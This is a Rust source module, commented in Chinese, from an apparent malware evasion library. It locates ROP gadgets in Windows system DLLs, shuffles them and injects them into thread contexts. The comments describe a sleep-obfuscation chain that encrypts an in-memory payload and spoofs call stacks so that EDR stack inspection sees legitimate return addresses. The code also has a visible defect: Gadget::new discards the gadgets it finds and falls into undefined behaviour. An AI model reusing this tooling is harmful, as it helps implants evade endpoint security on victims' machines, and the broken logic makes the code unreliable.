//#![allow(unused)]

use crate::config::Config;
use crate::stealth_bail;
use crate::{
    error::{HypnusError, Result},
    spoof::Unwind,
};
use alloc::vec::Vec;
use core::ffi::c_void;
use core::slice::from_raw_parts;
use obfstr::obfstr as s;
use puerto::helper::PE;
use puerto::types::{CONTEXT, IMAGE_RUNTIME_FUNCTION};

// 本模块在项目中作用:主线程进入休眠时,要构建一条ROP执行链(修改内存属性->加密->延时->解密).为了让执行流能在os dll中合法的反复横跳,不能直接使用call敏感api.
// 而是在合法的os dll(这里使用kernerlbase.dll)的.text中(非leaf function且在.pdata注册的范围中)找到用于中转的jmp <reg>以及ROP链收尾的jmp [rbx] gadget.

// 通过串联多组 [AddRspXGadget ->伪造宿主函数栈帧 -> 目标函数参数与入口] 结构来构建真实的 ROP 链：
// 1. 调用 VirtualProtect 将 Payload内存修改为可读写（RW）属性，返回地址指向对应的 AddRspX1Gadget；
// 2. 调用加密函数对 Payload 进行内存加密，返回地址指向AddRspX2Gadget；
// 3. 调用 NtDelayExecution 执行合法的休眠延时，返回地址指向AddRspX3Gadget；
// 4. 休眠唤醒后，调用解密函数还原 Payload，返回地址指向AddRspX4Gadget；
// 5. 调用 VirtualProtect 恢复 Payload内存为可执行（RX）属性，返回地址指向最后的 AddRspX5Gadget；
// 6. 最终落入动态生成的恢复 Gadget（`mov rsp, rbp;ret`）。通过将原始栈指针从 rbp 还原到 rsp，瞬间一刀抛弃所有伪造的 ROP栈帧，完美闭环并恢复主线程的真实环境

// 本文件的作用就是去dll中搜寻/匹配然后提供这些碎片的地址

/// represent win64 general-purpose register suitable for indirect jumps 间接跳转的通用寄存器
///
/// 排除了fastcall的rcx rdx r8 r9及存放函数返回值的rax.rax的用途在64位os中是固定的(win和linux都适用):任何函数执行完毕,它的整数/指针返回值,必须且只能放在rax中交给调用者
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Reg {
    Rdi,
    R10,
    R11,
    R12,
    R13,
    R14,
    R15,
}

/// list of short jump opcode patterns mapped to their corresponding register
///
/// &[(&[u8], Reg)]对数组的引用,该数组的元素类型是(&[u8], Reg).其中第一个元素类型是&[u8](字节 slice),第二个是enum Reg
///
/// 作用:利用jmp特性在不同敏感api之间跳转
const JMP_GADGETS: &[(&[u8], Reg)] = &[
    // jmp rdi:跳转到rip存储的地址
    (&[0xFF, 0xE7], Reg::Rdi),
    // jmp r10
    (&[0x41, 0xFF, 0xE2], Reg::R10),
    // jmp r11
    (&[0x41, 0xFF, 0xE3], Reg::R11),
    // 以下均为jmp Reg
    (&[0x41, 0xFF, 0xE4], Reg::R12),
    (&[0x41, 0xFF, 0xE5], Reg::R13),
    (&[0x41, 0xFF, 0xE6], Reg::R14),
    (&[0x41, 0xFF, 0xE7], Reg::R15),
];

/// represent a resolved jump gadget in memory
/// contains the absolute address and the register it jumps through
#[derive(Debug, Clone, Copy)]
pub struct Gadget {
    /// absolute virtual address of the gadget
    pub addr: u64,

    /// the register used in the jump instruction
    pub reg: Reg,
}

impl Gadget {
    /// Searches for usable `jmp <reg>` gadgets in memory based on predefined opcodes.
    pub fn new(cfg: &Config) -> Self {
        // 可以手动分配栈,代替源码中使用的Vec,达到极致隐蔽.win的默认栈大小一般是1Mb,这里很小,几乎不会出现栈溢出
        let mut gadgets: Vec<Gadget> = Vec::new();

        // 通过Config.rs/Config获取要查找gadget的dll的基址
        // as *const u8以1字节为单位读取该指针指向的数据.源地址的指针仍然是u64大小的(win64下指针和地址永远64位)
        let modules = [
            cfg.modules.ntdll.as_ptr() as *const u8,
            cfg.modules.kernel32.as_ptr() as *const u8,
            cfg.modules.kernelbase.as_ptr() as *const u8,
        ];

        // 遍历三个dll;modules是数组,modules.iter()->引用的迭代器,其每次循环产生的元素类型是& *const u8.如果将&base(base= *const u8)改为base,则base= & *const u8.后续使用base时需要解引用(*base).这称为模式匹配的对消
        // 但在rust 2021之后,数组实现了IntoIterator ,这里可由源码&base in modules.iter().改为base in modules:base的类型就是*const u8
        //
        // base是modules中代表三个dll的基址
        for base in modules {
            if let Some(range) = get_text_section(base as *mut c_void) {
                // 通过find()找到const JMP_GADGETS中对应的jmp gadget
                find(base, range).first().copied();
            }
        }

        // shuffle to reduce pattern predictability
        shuffle(&mut gadgets);

        if let Some(gadget) = gadgets.first().copied() {
            gadget
        } else {
            // SAFETY: `gadgets` is guaranteed to be non-empty at this point due to prior validation.
            // If this invariant is ever broken, this will invoke undefined behavior
            unsafe { core::hint::unreachable_unchecked() }
        }

        // 函数返回前,主动将栈上数据擦除.这一功能是否需要?
    }

    /// injects this gadget into a given thread CONTEXT.Sets the rip to the gadget address and writes the target value into the appropriate general-purpose register for indirect jump
    ///
    /// (注意是一个private函数)将rip指向gadget(如 jmp 10),然后将target(如NtProjectViretualMemory)地址存入对应的寄存器(如r10):当cpu恢复执行,会先执行jmp r10进而调用target的函数.此为ROP链的标准用法
    fn apply(&self, ctx: &mut CONTEXT, target: u64) {
        // 将找到的Gaddet地址存入当前Context的rip.addr在struct Gadget中
        ctx.Rip = self.addr;

        // 匹配gadget中Reg,将真正要执行的函数地址放入对应的寄存器(如 gadget是r10,这里就将target放入r10)
        match self.reg {
            Reg::Rdi => ctx.Rdi = target,
            Reg::R10 => ctx.R10 = target,
            Reg::R11 => ctx.R11 = target,
            Reg::R12 => ctx.R12 = target,
            Reg::R13 => ctx.R13 = target,
            Reg::R14 => ctx.R14 = target,
            Reg::R15 => ctx.R15 = target,
        }
    }
}

/// Scans the provided memory region for `jmp <reg>` instruction patterns.
/// Only one gadget per register is recorded to avoid redundancy冗余.
///
/// 参数base为pe文件模块基址;region为.text节的内存区域的起始地址(由于dep的限制,只有.text节的内存页才能执行)
/// 返回的是Gadget结构体,给后续stack spoof使用
fn find<B>(base: *const u8, region: &B) -> Vec<Gadget>
where
    // 泛型参数B是自定义的类型用于描述region的类型:允许B在编译时大小未知
    // trait asref<u8>:B可以安全转为字节切片&[u8](如Vec<u8>,&str,Box<[u8]>这些实现AsRef<[u8]>trait 的类型)
    B: ?Sized + AsRef<[u8]>,
{
    // 存储找到的gadget:Vec需要动态内存分配,需要用到自定义的堆分配器(allocator.rs中)
    let mut gadgets = Vec::new();

    // 初始化一个固定大小的栈上的数组,没有运行时开销
    // seen[i]=true 用于标记找到了一个可用的能劫持寄存器的gadget
    let mut seen = [false; JMP_GADGETS.len()];

    // 直觉上似乎应先遍历.text,再匹配jmp的opcode
    // 这里先遍历opcdoe,针对每个opcode再.text中做u去安居搜索(特征驱动:节省大量的计算量)
    for (i, (pattern, reg)) in
        // 将slice JMP_GADGETS转为迭代器 .iter()产生的是引用,即每次循环产生的是指向元组的指针&[(&[u8],Reg)]
        // 给.iter()产生的指针加上一个counter,组成一个新的元组.即(usize, &(&[u8], Reg))
        JMP_GADGETS.iter().enumerate()
    {
        // seen[i]作为是否找到对应gaddet标志/开关,如果找到末尾会seen[i] = true;
        if seen[i] {
            // 对于找到的gaddet,不再继续执行下面的代码,转而进入下一个循环
            continue;
        }

        // find():Returns the index of the first occurrence of the given needle(指针)
        // region是.text的slice
        if let Some(pos) = memchr::memmem::find(region.as_ref(), pattern)
        // memchr::memmem::find()函数要求第一个函数是&[u8]类型.而region是一个满足AsRef<[u8]>的类型B,所以这里需要使用as_ref()转为&[u8](即slice,字节切片)
        // pattern 是上面解构JMP_GADGETS得到的第一个字段
        {
            // calculates absolute address based on module base
            gadgets.push(Gadget {
                addr: base as u64
                    + (
                        // .text节在当前内存的绝对起始的物理地址
                        region.as_ref().as_ptr() as usize
                    // 减去基址得到.text的RVA
                    -base as usize
                    // pos来自memchr::memmem::find():是pattern在region内部的起始索引位置.即节头到gaddet的距离
                    +pos
                    ) as u64,

                // JMP_GADGETS.iter()后reg就是&Reg,是指向Reg枚举的引用
                // *reg就是取值操作.发生了一次物理意义上的按位拷贝（Bitwise Copy）.Reg是一个有Copy trait的枚举
                reg: *reg,
            });

            // mark as found
            seen[i] = true;
        }
    }

    gadgets
}

/// Extracts the .text section from a loaded module using pe header parsing
/// 返回.text节区的slice(即包含.text节起始地址和长度的flat pointer).因为只有.text中的数据才会被cpu当作指令执行
/// 该返回的的slice的addr指向的是.text节区的VA,绝对虚拟地址,可以直接被读取或执行
pub fn get_text_section(base: *mut c_void) -> Option<&'static [u8]> {
    // 判断三个dll的基址base
    if base.is_null() {
        return None;
    }

    unsafe {
        let pe = PE::parse(base);

        // .text节的节区头
        let section = pe.section_by_name(s!(".text"))?;

        // .text节区的实际数据区;c_void本身没有大小不能直接用.add方法,本项目中对c_void 使用了#[repr(u8)],其内存大小被强行指定为1字节
        let ptr = base.add(section.VirtualAddress as usize);

        // 转为slice
        Some(from_raw_parts(
            // 自动转换:根据该函数返回地址-> Option<&'static [u8]>,infer 此处ptr.cast()应转为*const u8
            ptr.cast(),
            //IMAGE_SECTION_HEADER的Misc字段,类型是union
            // 其Misc.VirtualSize记录节区被加载到内存后的真实字节跨度,即cpu能看到的指令区域总长度,因为内存对齐的原因,可能比磁盘上的文件大.即该节区的逻辑大小,而非页中对齐后的物理大小
            section.Misc.VirtualSize as usize,
        ))
    }
}

/// represent the type of gadget used to spoof control flow transitions
/// 关于enum的初始化问题见rust grammer/enum
#[derive(Debug, Clone, Copy, Default)]
pub enum GadgetKind {
    /// call [rbx] gadget
    /// 使用#[default]指定Call当作默认值(必须先使用#[derive(Default)])
    #[default]
    Call,

    /// jmp [rbx] gadget
    Jmp,
}

impl GadgetKind {
    /// scans the specified image base for a supported control-flow gadget
    ///
    /// 作用:在该pe文件的整个.pdata节区中detect探测决定使用GadgetKind的call或jmp模式(call [rbx]/jmp [rbx]).由于GadgetKind是一个无状态的enum,不能存储地址.后续冗余设计了resolve()用于实际存储找到的gadget地址.可以改用GadgetKind::Call(*const u8,u32)一次性实现
    pub fn detect(base: *mut c_void) -> Result<Self> {
        // 抽象一个PE文件,用一个结构体代表PE文件,该结构体只有一个raw pointer.
        let pe = Unwind::new(PE::parse(base));

        // 解构exception table
        let Some(tables) = pe.entries() else {
            stealth_bail!(
                HypnusError::ExceptionTableNotFound,
                "failed to parse .pdata unwind info"
            )
        };

        // tables代表该 PE 文件中  .pdata  段里所有注册的  IMAGE_RUNTIME_FUNCTION结构体数组
        // 0xFF 0x13 : call rbx
        // 0xFF 0x23 : jmp  rbx
        // 在image_runtime_function异常目录中找到符合要求的gadget.为啥要找rbx.见注释3
        if scan_runtime(base, &[0xFF, 0x13], tables).is_some() {
            Ok(GadgetKind::Call)
        } else if scan_runtime(base, &[0xFF, 0x23], tables).is_some() {
            Ok(GadgetKind::Jmp)
        } else {
            stealth_bail!(
                HypnusError::SuitableCallJmpRbxGadgetNotFound,
                "no suitable call/jmp [rbx] gadget found in image"
            )
        }
    }

    /// Resolves the actual memory address of the detected gadget in `kernelbase.dll`.
    ///
    /// detect之后再kernelbase.dll中找到合适的gadget,返回对应的地址和其宿主函数栈帧大小
    pub fn resolve(&self, cfg: &Config) -> Result<(*mut u8, u32)> {
        // PE::parse设计为代表一个pe文件,这里用于代表一个dll.详见注释5
        let pe = Unwind::new(PE::parse(cfg.modules.kernelbase.as_ptr()));

        // let else解构并错误控制
        let Some(tables) = pe.entries() else {
            stealth_bail!(
                HypnusError::FailedToReadImageRuntimeFunction,
                "failed to read IMAGE_RUNTIME_FUNCTION entries from .pdata section"
            )
        };

        //
        match self {
            GadgetKind::Call => {
                let Some(res) =
                    scan_runtime(cfg.modules.kernelbase.as_ptr(), &[0xFF, 0x13], tables)
                else {
                    stealth_bail!(HypnusError::NotFoundCallRbx, "missing call [rbx] gadget")
                };
                Ok(res)
            }

            GadgetKind::Jmp => {
                let Some(res) =
                    scan_runtime(cfg.modules.kernelbase.as_ptr(), &[0xFF, 0x23], tables)
                else {
                    stealth_bail!(HypnusError::NotFoundJmprbx, "missing jmp [rbx] gadget")
                };
                Ok(res)
            }
        }
    }

    /// Returns the byte sequence representing the gadget's instruction pattern.
    /// 抛弃uwd/RestoreSynthetic转而使用自己的方式实现ROP链的收尾
    ///
    /// 返回一个u8数组,里面存放本函数中自定义的汇编指令opcode:在hypnus/src/spoof.rs/alloc_memory函数中,hypnus调用NtAllocateVirtualMemory在进程中分配一小块可执行内存页.之后调用bytes()把其中的opcode放入该内存页.用以取代uwd/RestoreSynthetic! 执行bytes()中的opcode,回到代码中实际的执行流
    ///
    /// 在构造伪造栈帧前,将当时的栈底rsp保存到rbp中.伪造栈帧被使用之后,利用本函数的opcode回到之前的执行流
    #[inline]
    pub fn bytes(self) -> &'static [u8] {
        match self {
            GadgetKind::Call => &[
                0x48, 0x83, 0x2C, 0x24, 0x02, // sub qword ptr [rsp], 2:减去call指令本身大小
                0x48, 0x89, 0xEC, // mov rsp, rbp
                0xC3, // ret
            ],
            GadgetKind::Jmp => &[
                0x48, 0x89, 0xEC, // mov rsp, rbp
                0xC3, // ret
            ],
        }
    }
}

/// scans the unwind info of a PE module to locate gadgets within valid runtime functions
/// 对fn find()找到的jmp <register> gadgets再次在.pdata中过滤/筛选. 详见注释1
///
/// 作用:指定dll基址/opcode/IMAGE_RUNTIME_FUNCTION的数组/slice,从中找到所有符合的gadget,存入vec中,打乱顺序.随机返回一个gadget的VA和其宿主函数的栈帧大小
///
pub fn scan_runtime<B>(
    module: *mut c_void, // dll基址
    pattern: &B,         // opcode
    runtime_table: &[IMAGE_RUNTIME_FUNCTION],
) -> Option<(*mut u8, u32)>
where
    B: ?Sized + AsRef<[u8]>,
{
    unsafe {
        // 存放找到的gadget?
        let mut gadgets = Vec::new();

        for runtime in runtime_table {
            // 内存寻址的基本单位是字节,所以之后对内存的操作都是以字节为单位的

            // 以下三个变量在内存中精确定位单个运行时函数的范围与大小
            let start = module as u64 + runtime.BeginAddress as u64;
            let end = module as u64 + runtime.EndAddress as u64;
            let size = end - start;

            // 对该单个运行时函数组成slice后进行搜索
            let bytes = from_raw_parts(start as *const u8, size as usize);
            // as_ref()如何转换类型 见注释2
            if let Some(pos) = memchr::memmem::find(bytes, pattern.as_ref()) {
                let addr = (start as *mut u8).add(pos);

                // 计算指定函数栈帧大小
                // uwd依赖的是dinvk,本项目依赖puerto所以这里使用transmute,以后uwd重构完成可以不用transmute
                if let Some(size) = uwd::ignoring_set_fpreg(module, core::mem::transmute(runtime)) {
                    if size != 0 {
                        gadgets.push((addr, size));
                    }
                }
            }
        }

        if gadgets.is_empty() {
            return None;
            // 打印错误信息的功能在 调用scan_runtime()处使用ok_or_else()或stealth_bail!实现
        }

        // Shuffle to reduce pattern predictability.
        shuffle(&mut gadgets);

        gadgets.first().copied()
    }
}

/// Extension trait to allow injecting gadgets into a CONTEXT struct dynamically.
pub trait GadgetContext {
    /// Modifies the current CONTEXT instance by injecting a jump gadget(即 jmp `<reg>` ).
    /// 
    /// 第一个参数&mut self;第二个Config,第三个参数target为敏感目标函数地址
    /// 
    /// 函数内部逻辑：
    /// 1. 在合法系统 DLL（ntdll/kernel32/kernelbase）的 .text段中扫描找到 jmp <reg> 的 gadget。
    /// 2. 将 context.Rip 设为该 gadget 的【虚拟地址】(使 CPU恢复时第一步跳向合法系统模块内的指令，规避 EDR 静态检测)。
    /// 3. 将目标函数地址 target 写入该 gadget 对应的【通用寄存器】(如R10/Rdi) 中。
    ///
    /// 当 ntcontinue 激活这个 context 后，CPU 执行路径为：
    /// CPU ──► 合法系统DLL!jmp <reg> ──► target 敏感函数。
    /// 这样在跳转瞬间，EDR 看到的 Rip 始终停留在合法 DLL的指令范围内，隐蔽性极高。
    fn jmp(&mut self,cfg:&Config,target:u64);
}

impl GadgetContext for CONTEXT {
     fn jmp(&mut self, cfg: &Config, target: u64) {
        let gadget = Gadget::new(cfg);
        gadget.apply(self, target);
    }
}

/// Randomly shuffles洗牌 the elements of a mutable slice in-place原地 using a pseudo-random伪随机
/// number generator seeded by the CPU's timestamp counter (`rdtsc`).
///
/// 随机打乱找到的候选gadget顺序,确保每次挑选的跳转指令都是随机的
pub fn shuffle<T>(list: &mut [T]) {
    let mut seed = unsafe {
        // _rdtsc()返回u64:读取TSC寄存器获取cpu时间戳计数器的值
        core::arch::x86_64::_rdtsc()
    };

    // rev()Reverses an iterator's direction
    for i in (1..list.len()).rev() {
        // 算法,直接使用源码中的算法会不会留下痕迹,有没有必要自定义?(没有这是glibc经典算法)
        seed = seed.wrapping_mul(1103515245).wrapping_add(12345);
        let j = seed as usize % (i + 1);
        list.swap(i, j);
    }
}

// 注释1
// find()和scan_runtime() 分别找到的是gadget的地址还是包含gadget函数的地址?
// 本文件中的fn find()为了能够跳转,在ROP执行找到的jmp <reg>时,线程没有陷入内核沉睡,EDR不会也来不及在这个瞬间去抓取堆栈,所以代码在.text节中随便找,不需要去.pdata中查是否存在.scan_runtime()找到的jmp [rbp]以及add rsp,X是用于ROP链收尾的,此时线程在NtDelayExecution中休眠,一旦edr用RtlVirtualUnwind来回溯检查,需要伪造栈让他们处于合法的/.pdata注册过的/非叶子函数内部:
// edr的线程堆栈审查,利用win内核的异常处理机制(通过RtlVirtualUnwind)顺着调用栈一层一层向上追溯,检查每个返回地址是否合法.如果直接使用find找到的gadgets.这里找到的gadget可能处于 函数之间对齐填充区/叶子函数内(叶子函数不调用其他函数,不开辟栈空间,没有注册.pdata).那么edr对回溯到的返回地址,在.pdata中查询时,会发现该地址不在任何注册的合法运行时函数范围内/该地址无法正常unwind
// 1. scan_runtime():遍历.pdata,要求找到的gadget必须位于一个在系统注册了异常处理信息的,合法的非叶子函数内部.以此,当edr执行RtlVirtualUnwind时,能通过.pdata找到unwind路径,表现的像一个完全正常的系统调用
// 2. 伪造栈还需要在栈上构造和真实函数一样的空间.find()的.text扫描只能找到内存地址,没有处理对应的栈空间信息.scan_runtime()通过uwd::ignoring_set_fpreg(module, runtime),解析对应函数UNWIND_INFO,精确计算该函数在进入时开辟的栈帧大小.这里的对应函数是:在dll中找到的包含gadget的合法的win的系统函数
// 3. 排除使用帧指针的复杂函数:有些函数会在prologue序言中,执行push rbp;mov rbp,rsp 使用rbp作为栈帧的基址指针.这类函数在unwind时,依赖rsp和rbp.scan_runtime()使用uwd::ignoring_set_fpreg过滤所有使用帧指针的函数,只保留纯靠rsp寻址的函数.
// 扩展:2中如果该函数没有执行:
// 栈回溯的本质缺陷:该函数起始没有被执行(prologue没有跑过),但是edr根本没办法知道该函数是否执行过.edr只能通过堆栈上的遗留信息去推测
// 因为cpu执行代码时,函数的调用关系并不是由操作系统实时记录的.唯一的历史记录就是留在内存栈上的返回地址(如A调用B,A的返回地址被push入栈).因此,当edr挂起线程,试图查看这个线程如何一步步调用到当前位置时,其唯一能做的就是读取当前栈内存,寻找那些指向系统dll的返回地址
// 因此,当edr看到栈上有个地址指向ntdll!RtlpSearchExceptionHandlers + 0x120（我们的 Gadget），在它的逻辑里，这唯一证明了：
// 该线程在过去的某个时刻,RtlpSearchExceptionHandlers调用了下一个函数，所以它的返回地址留在了这里.edr无法逆转时间去检查该函数的prologue当时有没有被cpu执行过.只要栈上的返回地址合法,且栈上空间大小对齐,edr就会认为这是一次合法的历史调用
// 扩展:2中这个函数的栈展开信息unwind info没有模拟,会不会被edr发现:
// 这个函数时win系统自带的,它的UNWIND_INFO本来就是真的,且已经注册在系统里.我么只需要让自己的物理栈内存布局去迎合它的UNWIND_INFO
// 这里的栈展开的流程见 源码解析/gadget.md

// 注释2
// 这里的转换不是通过implicit cast隐式转换的,而是通过rust的trait method call和auto-deref自动解引用实现的
// find()需要&[u8],B实现了AsRef<[u8]> trait.pattern调用as_ref()时,会自动解引用返回&[u8]

// 注释3
// 在进行stack spoof/ROP链构造时,几乎都会选择使用rbx
// 1. rbx是非易失性寄存器Non-volatile / Preserved Registers(RBX 、 RBP 、 RDI 、 RSI 、 R12 ~ R15):一个函数在使用这种寄存器之前,必须在prologue中将它们的值push到栈上备份,在函数epilogue前pop还原它们.且微软的调用约定保证,不管中间经历多少层系统调用,只要这层调用没有结束,rbx中的值就绝对不会改变
// 2. rsp,rbp有固定作用;rdi,rsi在很多拷贝函数中,被隐式的当作源/目的地址寄存器,值变化频繁;R12-R15:对应的机器指令长度较长(访问R12-R15寄存器需要增加REX前缀字节),使得在系统dll中,对应的gadget较少.因此,只剩下rbx这个纯粹的、无任何特殊指令隐式绑定的通用数据暂存器,且的指令非常短

// 注释5:为什么代表pe的结构体可以用来表示dll
// Windows 的 DLL 加载本质是“内存映射”:硬盘上kernelbase.dll是一个二进制文件,当一个程序需要使用它时,os不会像读取一个text文件那样,将其读取缓存buffer.而是使用内存映射文件memory-mapped file技术
// 1. 开辟空间: os在进程虚拟空间中,划出足够大的连续地址区域(大小由pe头的sizeofimage决定)
// 2. 拉取头部: os把kernelbase.dll(和exe一样都是可执行文件即pe文件)前面的部分(Headers,包含Dos头,Nt头,节区表)原封不动的复制到这块内存的起点
// 3. 对齐填充节区: 接着把文件的.text .data按照内存页大小(通常4k)对齐,映射到这块内存的后续位置
// 4. 返回起点指针：最后，操作系统把这块连续内存区域的首地址（也就是Headers 的起点）返回给程序。这个首地址在 Windows 里被称为  HMODULE，或者叫  ImageBase （模块基地址）
// 5. 这样,该进程的地址空间中有了两个独立的PE文件结构(一个win进程的地址空间可以有多个pe结构.主程序samoa.exe是一个pe结构,其依赖的每个dll物理上都是独立的pe文件).每个pe文件加载后占用不同的/互不重叠的内存地址(相关信息存放在PEB中)
